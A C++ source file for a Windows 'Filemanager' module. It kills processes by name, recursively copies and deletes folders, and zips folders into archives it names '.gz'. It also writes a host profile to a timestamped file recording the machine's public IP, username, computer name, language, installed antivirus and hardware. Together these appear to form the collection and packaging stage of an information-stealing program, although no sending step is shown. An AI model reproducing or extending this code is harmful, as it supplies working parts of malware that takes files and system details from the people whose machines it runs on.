#include "Filemanager.h"
#include "include/zip/zip.h"
#include "include/zip/unzip.h"
#include "SystemInfo.h"
#include <Windows.h>
#include <Shlwapi.h>
#include <iostream>
#include <string>
#include <fstream>
#include <mutex>
#include <Psapi.h>
#include <chrono>
#include <ctime>

#pragma comment(lib,"Shlwapi.lib")

#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING // Disable deprecation warnings for experimental filesystem feature.
#include <experimental/filesystem> // Include the experimental filesystem library.
namespace fs = std::experimental::filesystem; // Alias the filesystem namespace to 'fs' for easier access.

#define CHUNK_SIZE 15384 // Define a constant for chunk size (though it is not used in this part of the code).

// Function to recursively delete a file or directory
void Filemanager::DeleteFileOrDir(std::string path) {
    DWORD file_attribute = GetFileAttributesA(path.c_str()); // Retrieve the file attributes for the specified path.

    if (file_attribute == INVALID_FILE_ATTRIBUTES) { // If the file or directory doesn't exist, return immediately.
        return;
    }

    if (file_attribute & FILE_ATTRIBUTE_DIRECTORY) { // Check if the path is a directory.
        std::string search_path = path + "\\*"; // Create a search path to include all files in the directory.
        WIN32_FIND_DATAA find_data; // Declare a struct to hold information about found files.
        HANDLE handle = FindFirstFileA(search_path.c_str(), &find_data); // Start finding files in the directory.

        if (handle != INVALID_HANDLE_VALUE) { // If files are found, iterate over them.
            do {
                if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
                    continue; // Skip the '.' and '..' directory entries.
                }

                std::string file_path = path + "\\" + find_data.cFileName; // Get the full path of the found file or directory.
                DeleteFileOrDir(file_path); // Recursively call the function to delete the contents.
                RemoveDirectory(file_path.c_str()); // Remove the directory after its contents are deleted.

            } while (FindNextFileA(handle, &find_data) != 0); // Continue searching for the next file.

            FindClose(handle); // Close the search handle once done.
        }
        RemoveDirectoryA(path.c_str()); // Finally, remove the directory itself after its contents have been deleted.
    }
    else { // If the path is a file (not a directory).
        DeleteFileA(path.c_str()); // Delete the file.
    }
}

// Function to generate a unique file name if a file with the same name exists.
std::string GetUniqueFileName(const std::string& path)
{
    if (!PathFileExistsA(path.c_str())) // Check if the file doesn't exist.
        return path; // If the file doesn't exist, return the original path.

    std::string dir = path.substr(0, path.find_last_of("\\/")); // Extract the directory path.
    std::string name = path.substr(path.find_last_of("\\/") + 1); // Extract the file name.
    std::string ext = ""; // Initialize an empty string for file extension.
    size_t dot_pos = name.find_last_of("."); // Find the position of the last dot (extension separator).
    if (dot_pos != std::string::npos) // If a dot is found (indicating a file extension exists).
    {
        ext = name.substr(dot_pos); // Extract the extension.
        name = name.substr(0, dot_pos); // Remove the extension from the file name.
    }

    int counter = 1; // Initialize a counter to append to the file name.
    std::string new_path; // String to hold the new file path.
    do {
        new_path = dir + "\\" + name + "_" + std::to_string(counter++) + ext; // Append the counter to the file name.
    } while (PathFileExistsA(new_path.c_str())); // Keep incrementing the counter until a unique file name is found.

    return new_path; // Return the unique file path.
}

// Function to kill processes based on their name
bool Filemanager::killprocess(const std::string& process_name) {
    bool result = false; // Default result is false (indicating failure if not changed).

    // Get process IDs of all processes currently running
    std::vector<DWORD> process_ids; // Vector to store the process IDs of the matching processes.
    DWORD pid_array[1024], cb_needed; // Array to hold the process IDs and a variable to store the required buffer size.
    if (EnumProcesses(pid_array, sizeof(pid_array), &cb_needed)) { // EnumProcesses retrieves a list of all process IDs.
        DWORD total_processes = cb_needed / sizeof(DWORD); // Calculate the total number of processes based on buffer size.
        for (DWORD i = 0; i < total_processes; ++i) { // Loop through each process ID in the array.
            HANDLE process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid_array[i]);
            // Open the process to query its information and read its memory.
            if (process_handle != NULL) { // If the process handle is valid, continue processing.
                CHAR image_path[MAX_PATH]; // Array to hold the process image (executable) file path.
                if (GetProcessImageFileNameA(process_handle, image_path, MAX_PATH) > 0) { // Get the path of the executable.
                    std::string process_path(image_path); // Convert image path to a string for easier manipulation.
                    std::size_t last_separator = process_path.find_last_of("\\/"); // Find the last separator in the path.
                    if (last_separator != std::string::npos) {
                        std::string process_filename = process_path.substr(last_separator + 1); // Extract the file name (process executable).
                        if (process_filename == process_name) { // If the file name matches the given process name.
                            process_ids.push_back(pid_array[i]); // Add this process ID to the list of matching process IDs.
                        }
                    }
                }
                CloseHandle(process_handle); // Close the process handle after use.
            }
        }
    }

    // Kill each process with the given ID from the process_ids vector.
    for (DWORD pid : process_ids) { // Iterate through all the process IDs.
        HANDLE process_handle = OpenProcess(PROCESS_TERMINATE, FALSE, pid); // Open the process with terminate privileges.
        if (process_handle != NULL) { // If the process handle is valid.
            result = TerminateProcess(process_handle, 0); // Attempt to terminate the process, passing 0 as the exit code.
            CloseHandle(process_handle); // Close the process handle after termination attempt.
        }
    }

    return result; // Return whether the process termination was successful or not.
}

// Function to copy a directory (including subdirectories) to a new location
void Filemanager::CopyDirectoryMultiByte(const std::string& source_dir, const std::string& dest_dir) {
    fs::path source_path(source_dir); // Create a path object for the source directory.
    fs::path dest_path(dest_dir); // Create a path object for the destination directory.

    if (!fs::exists(source_path)) { // If the source directory does not exist.
        std::cerr << "Source directory does not exist: " << source_dir << std::endl;
        return; // Exit the function early.
    }

    if (!fs::is_directory(source_path)) { // If the source path is not a directory.
        std::cerr << "Source is not a directory: " << source_dir << std::endl;
        return; // Exit the function early.
    }

    if (!fs::exists(dest_dir)) { // If the destination directory does not exist.
        try {
            fs::create_directories(dest_dir); // Attempt to create the destination directory.
        }
        catch (const std::exception& e) { // If directory creation fails.
            std::cerr << "Failed to create directory: " << dest_dir << ", " << e.what() << std::endl;
            return; // Exit the function early.
        }
    }

    if (!fs::is_directory(dest_path)) { // If the destination path is not a directory.
        std::cerr << "Destination is not a directory: " << dest_dir << std::endl;
        return; // Exit the function early.
    }

    // Loop through all entries in the source directory.
    for (const auto& entry : fs::directory_iterator(source_path)) {
        if (fs::is_directory(entry.path())) { // If the entry is a directory.
            std::string dirname = entry.path().filename().string(); // Extract the directory name.
            fs::create_directory(dest_path / dirname); // Create the directory in the destination path.
            CopyDirectoryMultiByte(entry.path().string(), (dest_path / dirname).string()); // Recursively copy subdirectories.
        }
        else { // If the entry is a file.
            std::string filename = entry.path().filename().string(); // Extract the file name.
            fs::copy_file(entry.path(), dest_path / filename, fs::copy_options::skip_existing); // Copy the file, skipping if it already exists.
        }
    }
}

// Function to calculate the total size of a directory and its contents
double Filemanager::DirectorySize(const std::string& path)
{
    double size = 0; // Variable to accumulate the total size of the directory.

    WIN32_FIND_DATAA find_data; // Structure to hold information about each file found.
    HANDLE handle = FindFirstFileA((path + "\\*").c_str(), &find_data); // Start finding files in the directory.
    if (handle == INVALID_HANDLE_VALUE) // If unable to find the first file.
        throw std::runtime_error("Failed to find first file."); // Throw an exception.

    // Loop through all files in the directory.
    do {
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0)
            continue; // Skip the '.' and '..' entries, which are not actual files.

        std::string file_path = path + "\\" + find_data.cFileName; // Get the full path of the current file.
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // If the current entry is a directory.
        {
            try {
                size += DirectorySize(file_path); // Recursively calculate the size of the subdirectory.
            }
            catch (const std::exception&) { // If there is an error, skip this directory.
            }
        }
        else { // If the current entry is a file.
            try {
                HANDLE file_handle = CreateFileA(file_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                // Open the file to read its size.
                if (file_handle == INVALID_HANDLE_VALUE)
                    throw std::runtime_error("Failed to open file."); // If unable to open the file, throw an exception.

                LARGE_INTEGER file_size; // Structure to hold the file size.
                if (!GetFileSizeEx(file_handle, &file_size))
                    throw std::runtime_error("Failed to get file size."); // If unable to get the file size, throw an exception.

                size += static_cast<double>(file_size.QuadPart) / (1024.0 * 1024.0); // Add the file size (converted to MB) to the total.

                CloseHandle(file_handle); // Close the file handle after use.
            }
            catch (const std::exception&) { // If there is an error, skip this file.
            }
        }
    } while (FindNextFileA(handle, &find_data) != 0); // Continue to the next file.

    FindClose(handle); // Close the find handle when done.

    return size; // Return the total size of the directory (in MB).
}

// Function to gather system information and write it to a text file
void Filemanager::writeFileSystemInfo(std::string& path)
{
    // Create a string with system information like IP, Date, Username, Computer Name, Language, and Antivirus details.
    std::string info = "\nIP:  " + SystemInfo::getPublicIpAsync() + "\nDate:  " + SystemInfo::getDateTime()
        + "\nUsername: " + SystemInfo::getUserName() + "\n CompName:  " + SystemInfo::getComputerName()
        + "\nLanguage:  " + SystemInfo::getLanguage() + "\nAntivirus:  " + SystemInfo::getAntivirus()
        + "\n "
        + "\n ===== Hardware ====="
        + "\nCPU:  " + SystemInfo::getCpuName() + "\n GPU: " + SystemInfo::getGpuName() + "\nRAM:  " + SystemInfo::getRamAmount()
        + "\nPower:  " + SystemInfo::getBattery() + "\nScreen:  " + SystemInfo::getScreenMetrics()
        + "\n"
        + "\n ===== Domains ====="
        + "\n"; // Collect hardware-related information.

    // Get the current system time to use as part of the filename for the output file.
    auto now = std::chrono::system_clock::now(); // Get the current system time.
    std::time_t time = std::chrono::system_clock::to_time_t(now); // Convert to time_t for use with std::localtime.

    char timestamp[64]; // Buffer to hold the formatted timestamp.
    std::tm timeInfo; // Structure to hold local time.

    // Use std::localtime_s instead of std::localtime to avoid potential issues in thread safety.
    if (localtime_s(&timeInfo, &time) != 0) { // Convert time to local time.
        std::cerr << "Error getting local time!" << std::endl;
        return; // Exit if there is an error in obtaining local time.
    }

    // Format the timestamp in the format: YearMonthDay_HourMinuteSecond (e.g., "20241115_153045")
    std::strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", &timeInfo);

    // Construct the filename using the timestamp.
    std::string filename = timestamp + std::string(".txt");

    // Open the output file in the provided directory path.
    std::ofstream file(path + "\\" + filename); // Combine the path and filename to get the full file path.

    // Check if the file was opened successfully.
    if (!file.is_open()) {
        std::cerr << "Failed to create file" << std::endl;
        return; // Exit if the file couldn't be opened.
    }

    // Write the collected system information into the file.
    file << info;
    file.close(); // Close the file after writing the information.
}

// Function to add a file to a zip archive
void zip_add_file(zipFile zf, const std::string& file, const std::string& baseDir, bool password)
{
    // Create a relative path for the file to be added to the zip, excluding the base directory.
    std::string relative_path = file.substr(baseDir.length());

    // Open the file for reading in binary mode.
    FILE* fp = nullptr;
    errno_t errr = fopen_s(&fp, file.c_str(), "rb"); // Open file in read-binary mode.
    if (errr != 0 || fp == nullptr) { // If there was an error opening the file.
        std::cerr << "Error opening file: " << file << ", errno: " << errr << std::endl;
        return; // Exit the function if the file could not be opened.
    }

    // Prepare a zip_fileinfo structure to hold metadata for the file in the zip archive.
    zip_fileinfo zi;
    memset(&zi, 0, sizeof(zi)); // Initialize the structure to zero.

    // Add the file to the zip archive using the relative path.
    int err = zipOpenNewFileInZip(zf, relative_path.c_str(), &zi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION);
    if (err != ZIP_OK) { // If there was an error adding the file to the zip.
        std::cout << "Error adding file to zip: " << file << std::endl;
        fclose(fp); // Close the file if there was an error.
        return; // Exit the function if the file couldn't be added.
    }

    char buf[CHUNK_SIZE]; // Buffer to store data read from the file.
    size_t bytesRead; // Variable to store the number of bytes read from the file.

    // Loop to read the file in chunks and write the data to the zip archive.
    do {
        bytesRead = fread(buf, 1, CHUNK_SIZE, fp); // Read a chunk of the file into the buffer.

        if (bytesRead < CHUNK_SIZE) { // If the last chunk is smaller than the buffer size.
            if (feof(fp)) { // If the end of the file has been reached.
                err = zipWriteInFileInZip(zf, buf, static_cast<unsigned int>(bytesRead)); // Write the remaining bytes to the zip.
                if (err < 0) {
                    std::cout << "Error writing file to zip: " << file << std::endl;
                }
                break; // Exit the loop after writing the last chunk.
            }
            else if (ferror(fp)) { // If there was an error reading the file.
                std::cout << "Error reading file: " << file << std::endl;
                break; // Exit the loop if there was a read error.
            }
        }
        err = zipWriteInFileInZip(zf, buf, static_cast<unsigned int>(bytesRead)); // Write the chunk to the zip file.
        if (err < 0) { // If there was an error writing to the zip.
            std::cout << "Error writing file to zip: " << file << std::endl;
            break; // Exit the loop if the writing failed.
        }
    } while (bytesRead > 0); // Continue reading and writing chunks as long as there are bytes to read.

    // Close the file in the zip archive after writing is complete.
    err = zipCloseFileInZip(zf);
    if (err != ZIP_OK) { // If there was an error closing the file in the zip.
        std::cout << "Error closing file in zip: " << file << std::endl;
    }

    fclose(fp); // Close the file pointer after processing is complete.
}

// Function to add a folder (and its contents) to a zip archive.
void zip_add_folder(zipFile zf, const std::string& folder, const std::string& baseDir, bool password)
{
    // Construct the search path to find all files and subdirectories in the folder.
    std::string search_path = folder + "\\*.*"; // This will match all files and directories in the folder.

    WIN32_FIND_DATAA fd; // Structure to hold file data.
    HANDLE hFind = FindFirstFileA(search_path.c_str(), &fd); // Start searching for files and directories in the folder.

    // Check if the search was successful.
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            // Skip "." (current directory) and ".." (parent directory) entries.
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) {
                continue; // Skip these entries.
            }

            // Construct the full path to the current file or subdirectory.
            std::string path = folder + "\\" + fd.cFileName;

            // Check if the current entry is a directory.
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // If it's a directory, recursively add it to the zip.
                zip_add_folder(zf, path, baseDir, password);
            }
            else {
                // If it's a file, add the file to the zip archive.
                zip_add_file(zf, path, baseDir, password);
            }
        } while (FindNextFileA(hFind, &fd)); // Continue to the next file or directory.

        // Close the search handle after iterating through all files and directories.
        FindClose(hFind);
    }
}

// Function to add a file or folder (zip) to a .gz archive.
bool Filemanager::zip_add_to_archive(std::string& path, bool password)
{
    // Structure to hold file attributes (e.g., file type).
    WIN32_FILE_ATTRIBUTE_DATA fileAttributes;

    // Get the file attributes of the specified path (to check if it's a file or directory).
    BOOL success = GetFileAttributesExA(path.c_str(), GetFileExInfoStandard, &fileAttributes);

    // If the file attributes could not be retrieved, print an error and return false.
    if (!success) {
        std::cout << "Error getting file attributes: " << path << std::endl;
        return false;
    }

    // Construct the path for the .gz archive (add ".gz" extension to the original path).
    std::string strPath = path + ".gz";

    // Open the .gz file for writing the zip data.
    zipFile zf = zipOpen3(strPath.c_str(), NULL, NULL, NULL);

    // Check if the zip file was opened successfully.
    if (!zf) {
        std::cout << "Error opening gz." << std::endl;
        return false; // If opening the zip file failed, return false.
    }

    // Store the base directory path to use for relative file paths within the archive.
    std::string baseDir = path;

    // Check if the specified path is a directory.
    if (fileAttributes.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        // If it's a directory, recursively add all its contents (files and subdirectories) to the zip archive.
        zip_add_folder(zf, path, baseDir, password);
    }
    else {
        // If it's a file, add just the file to the zip archive.
        zip_add_file(zf, path, baseDir, password);
    }

    // Close the zip file after adding the files or directories.
    if (zipClose(zf, NULL) != ZIP_OK) {
        std::cout << "Error closing zip." << std::endl;
        return false; // If closing the zip failed, return false.
    }

    return true; // Successfully added the file or folder to the archive and closed the zip.
}

